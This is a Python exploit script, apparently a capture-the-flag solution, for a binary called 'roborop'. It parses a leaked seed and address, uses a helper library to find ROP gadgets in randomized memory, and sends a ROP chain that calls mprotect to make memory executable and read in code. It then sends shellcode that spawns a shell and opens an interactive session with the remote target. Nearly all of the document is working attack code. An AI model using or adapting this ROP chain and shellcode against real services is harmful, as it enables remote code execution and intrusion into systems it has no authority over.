#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import ctypes

bin_file = './roborop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

class Gadgets(ctypes.Structure):
    _fields_ = [('POP_RAX', ctypes.c_ulong), ('POP_RDI', ctypes.c_ulong), ('POP_RSI', ctypes.c_ulong), ('POP_RDX', ctypes.c_ulong), ('SYSCALL', ctypes.c_ulong)]

def attack(conn, **kwargs):
    conn.recvuntil(b'seed: ')
    seed = int(conn.recvline(keepends=False), 16)

    conn.recvuntil(b'addr: ')
    addr = int(conn.recvline(keepends=False), 16)

    libgadget = ctypes.CDLL('./find_ropgadget.so') 
    libgadget.gadget_in_randmem.restype = ctypes.POINTER(Gadgets)
    gadgets = libgadget.gadget_in_randmem(seed, 0x4000000).contents

    addr_pop_rax = addr + gadgets.POP_RAX
    addr_pop_rdi = addr + gadgets.POP_RDI
    addr_pop_rsi = addr + gadgets.POP_RSI
    addr_pop_rdx = addr + gadgets.POP_RDX
    addr_syscall = addr + gadgets.SYSCALL

    ropchain = flat([
        addr_pop_rax, constants.SYS_mprotect,
        addr_pop_rdi, addr,
        addr_pop_rsi, 0x1000,
        addr_pop_rdx, constants.PROT_READ|constants.PROT_WRITE|constants.PROT_EXEC,
        addr_syscall,

        addr_pop_rax, constants.SYS_read,
        addr_pop_rdi, constants.STDIN_FILENO,
        addr_pop_rsi, addr,
        addr_pop_rdx, 0x1000,
        addr_syscall,

        addr,
    ])
    conn.sendafter(b'rops: ', ropchain)

    '''
    libgenrand = ctypes.CDLL("./gen_randmem.so") 

    libgenrand.randmem.restype = ctypes.c_void_p
    mem_ptr = libgenrand.randmem(seed, 0x4000000)
    mem = bytearray(ctypes.string_at(mem_ptr, 0x4000000*ctypes.sizeof(ctypes.c_int)))

    binary = ELF.from_bytes(mem, vma=addr)
    rop = ROP(binary)
    rop(rax=constants.SYS_mprotect, rdi=addr, rsi=0x1000, rdx=constants.PROT_READ|constants.PROT_WRITE|constants.PROT_EXEC)
    rop.call(rop.find_gadget(['syscall', 'ret']).address)
    rop(rax=constants.SYS_read, rdi=constants.STDIN_FILENO, rsi=addr, rdx=0x1000)
    rop.call(rop.find_gadget(['syscall', 'ret']).address)
    rop.call(addr)
    conn.sendafter(b'rops: ', bytes(rop))
    '''

    sleep(0.5)
    conn.send(asm(shellcraft.sh()))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
